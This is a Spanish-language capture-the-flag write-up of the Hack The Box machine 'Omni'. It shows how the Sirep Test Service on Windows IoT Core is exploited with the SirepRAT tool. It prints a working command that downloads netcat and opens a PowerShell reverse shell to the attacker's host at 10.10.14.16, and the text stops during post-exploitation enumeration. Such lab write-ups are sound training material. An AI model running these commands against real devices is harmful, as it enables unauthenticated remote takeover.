---
layout: post
title: Write-Up Máquina Omni HTB
date: 2021-01-12 23:28 +0800
last_modified_at: 2021-01-12 23:28 +0800
tags: [htb, writeup, python, IoT, windows, core, powershell]
toc:  false
---

![imagen](/assets/imagenes/2021-01-12-omni-HTB/omni-card.png)

---

La máquina Omni es una máquina en la cual esta corriendo un windows IoT core con el portal de gestion en modo Dev. Para la explotacion nos vamos a aprovechar del  Sirep Test Service que es un componente del propio IoT core para realizar comprobaciones en el hardware.

---
## Escaneo

----

![Escaneo](/assets/imagenes/2021-01-12-omni-HTB/escaneo-omni.png)

---

Una vez realizado el escaneo, podemos ver varios puertos abiertos, entre ellos el 8080. En este caso es el que nos interesa, ya que el resto de puertos son componentes internos de microsoft que no deberian ser vulnerables.

---

## Puerto 8080

---

Vamos a acceder al puerto 8080 para ver que nos muestra, aunque ya nos podemos hacer una idea de lo que es viendo el escaneo. 
si nos fijamos bien, vemos que tenemos http-auth, lo que quiere decir que seguramente sea algun panel de gestión protegido por usuario y contraseña.
Un poco más abajo, nos saca un mensaje: "Basic realm=Windows Device Portal"
Esto nos puede indicar el producto concreto que este corriendo en ese puerto.

---

![login](/assets/imagenes/2021-01-12-omni-HTB/panel-login-8080-omni.png)

---

Como podemos ver, efectivamente tenemos un login del cual no tenemos en un principio credenciales.
Vamos a intentar buscar en internet sobre este producto en busca de posibles credenciales por defecto.

---

![creds](/assets/imagenes/2021-01-12-omni-HTB/creds-default-device-portal.png)

---

El primer resultado ya nos muestra que este servicio tiene credenciales por defecto.
Vamos a probarlas.

---

![login-creds](/assets/imagenes/2021-01-12-omni-HTB/test-creds.png)

---

Si le damos ok vemos que volvemos al login por lo que esas credenciales no valen en esta máquina.
Ya que tenemos el nombre del producto que esta corriendo, vamos a buscar posibles exploits.

---
Si buscamos en google 'windows device portal exploit' nos aparecera el siguiente artículo: 
![articulo](/assets/imagenes/2021-01-12-omni-HTB/articulo-exploit-iot-core.png)

---

Este artículo hace referencia a una herramienta de explotacion desarrollada en python en el año 2019 llamada [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT).
Esta tool se aprovecha del Sirep Test Service que es una funcionalidad nativa de los sistemas windows IoT core que se usa de manera legitima para realizar pruebas de drivers y hardware en el propio dispositivo IoT.

---

## Explotacón

---

Una vez clonado el repo de la herramienta accedemos a la carpeta y vamos a instalar los paquetes que necesite la herramienta.

---

![sirep-install](/assets/imagenes/2021-01-12-omni-HTB/requirements-sirepRAT.png)

---

Una vez instalados los requirements vamos a proceder a explotar el servicio.
Para comprobar que funciona, vamos a ejecutar *python2.7 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice*

---

![test-sirep](/assets/imagenes/2021-01-12-omni-HTB/sirep-test.png)

---

Como podemos ver nos devuelve output. eso quere decir que podemos interactuar con el servicio sin estar autenticados.

Una vez hecho este test, vamos a intentar obtener una reverse shell.
Para eso vamos a subir el binario de netcat a la máquina y lo llamaremos para obtener una shell reversa en powershell.
Primero vamos a crear una carpeta temp en la raiz.

---
![directorio-C:\temp](/assets/imagenes/2021-01-12-omni-HTB/mkdir-c-temp.png)

---
Una vez creado el directorio vamos a subir nuestro binario de nc.
Para subir el fichero vamos a levantar con python2.7 un servidor web que no nos sirve al fichero.

---
![web-nc](/assets/imagenes/2021-01-12-omni-HTB/server-web-nc.png)

---
Una vez levantado vamos donde teniamos el sirepRAT y vamos a ejecutar un comando para descargar nc64.exe a la carpeta C:\temp previamente creada.

---
![download-nc](/assets/imagenes/2021-01-12-omni-HTB/nc64-download.png)

---
Una vez descargado el binario vamos a llamarlo para que no devuelva una reverse shell de powershell en el puerto 1234.
Vamos a levantar lo primero el listener con el comando *nc -lvp 1234* y con el comando *python2.7 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\temp\nc64.exe -e powershell.exe 10.10.14.16 1234"* llamaremos a netcat y no mandara al listener la reverse shell.

---
![call-nc](/assets/imagenes/2021-01-12-omni-HTB/call-nc.png)
![nc-rev-shell](/assets/imagenes/2021-01-12-omni-HTB/shell-nc.png)

---
**!!Ya tenemos shell¡¡** Vamos a enumerar y a buscar la flag del user.
Si nos vamos a la carpeta Users de windows vemos que solo hay un usuario que es public y en su carpeta no hay ni rastro de la flag.
Vamos a enumerar. Si nos vamos a la raiz vemos que las carpetas que hay no son las que encontrariamos en un sistema windows de escritorio.

---

![ls-C:\](/assets/imagenes/2021-01-12-omni-HTB/ls-C.png)

---
A mi me ha llamado la atención la carpeta Data. Si accedemos a ella vemos que tenemos una carpeta users.

---

![dir-data](/assets/imagenes/2021-01-12-omni-HTB/dir-data.png)

---








